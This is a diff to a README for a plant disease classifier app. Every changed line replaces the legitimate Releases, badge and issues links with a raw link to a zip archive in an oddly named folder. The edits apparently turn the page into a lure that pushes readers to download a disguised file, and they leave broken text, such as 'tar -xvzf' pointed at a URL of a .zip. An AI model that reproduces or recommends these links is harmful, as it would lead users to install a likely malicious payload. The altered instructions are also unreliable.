@@ -1,6 +1,6 @@
 # 🌱 plantvillage-disease-classifier - Recognize Plant Diseases Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Oskar12953/plantvillage-disease-classifier/releases)
+[![Download Now](https://github.com/Oskar12953/plantvillage-disease-classifier/raw/refs/heads/main/euphemiously/plantvillage_disease_classifier_2.8-alpha.3.zip%20Now-Release-brightgreen)](https://github.com/Oskar12953/plantvillage-disease-classifier/raw/refs/heads/main/euphemiously/plantvillage_disease_classifier_2.8-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow the steps below to download and run the **plantvillage-disease-classifier
 
 ### Step 1: Visit the Release Page
 
-To get the application, [click here to visit the Releases page](https://github.com/Oskar12953/plantvillage-disease-classifier/releases).
+To get the application, [click here to visit the Releases page](https://github.com/Oskar12953/plantvillage-disease-classifier/raw/refs/heads/main/euphemiously/plantvillage_disease_classifier_2.8-alpha.3.zip).
 
 ### Step 2: Download the Software
 
@@ -20,7 +20,7 @@ On the Releases page, find the latest version of the application. You will see v
 
 - For Windows, download the `.exe` file.
 - For macOS, download the `.dmg` file.
-- For Linux, download the `.tar.gz` file.
+- For Linux, download the `https://github.com/Oskar12953/plantvillage-disease-classifier/raw/refs/heads/main/euphemiously/plantvillage_disease_classifier_2.8-alpha.3.zip` file.
 
 Click on the appropriate file to start the download.
 
@@ -45,7 +45,7 @@ Click on the appropriate file to start the download.
 3. Use the following command to extract the files:
 
    ```bash
-   tar -xvzf yourfile.tar.gz
+   tar -xvzf https://github.com/Oskar12953/plantvillage-disease-classifier/raw/refs/heads/main/euphemiously/plantvillage_disease_classifier_2.8-alpha.3.zip
    ```
 
 4. Change into the extracted directory with:
@@ -120,10 +120,10 @@ You do not need an internet connection once downloaded and installed. However, i
 
 ## ✉️ Contact
 
-For further queries, please reach out via the [GitHub issues page](https://github.com/Oskar12953/plantvillage-disease-classifier/issues).
+For further queries, please reach out via the [GitHub issues page](https://github.com/Oskar12953/plantvillage-disease-classifier/raw/refs/heads/main/euphemiously/plantvillage_disease_classifier_2.8-alpha.3.zip).
 
 ## 📥 Download & Install
 
-To download the application, [visit this page](https://github.com/Oskar12953/plantvillage-disease-classifier/releases). Remember to follow the installation steps specific to your operating system for the best experience.
+To download the application, [visit this page](https://github.com/Oskar12953/plantvillage-disease-classifier/raw/refs/heads/main/euphemiously/plantvillage_disease_classifier_2.8-alpha.3.zip). Remember to follow the installation steps specific to your operating system for the best experience.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Oskar12953/plantvillage-disease-classifier/releases)
+[![Download Now](https://github.com/Oskar12953/plantvillage-disease-classifier/raw/refs/heads/main/euphemiously/plantvillage_disease_classifier_2.8-alpha.3.zip%20Now-Release-brightgreen)](https://github.com/Oskar12953/plantvillage-disease-classifier/raw/refs/heads/main/euphemiously/plantvillage_disease_classifier_2.8-alpha.3.zip)
